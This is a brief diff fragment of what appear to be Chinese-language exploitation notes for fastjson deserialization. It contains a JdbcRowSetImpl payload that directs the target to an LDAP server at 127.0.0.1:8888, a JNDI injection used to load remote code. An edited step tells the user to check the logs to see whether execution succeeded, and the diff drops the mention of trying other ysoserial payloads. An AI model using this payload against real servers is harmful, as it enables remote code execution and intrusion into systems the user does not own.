@@ -41,7 +41,7 @@ User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X)
 {"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://127.0.0.1:8888/Object","autoCommit":true}
 
 
-3. 查看日志是否执行成功，如果没有，用ysoserial的其他Payload尝试生成。
+3. 查看日志是否执行成功
 
 ===================================================================================================
 else:
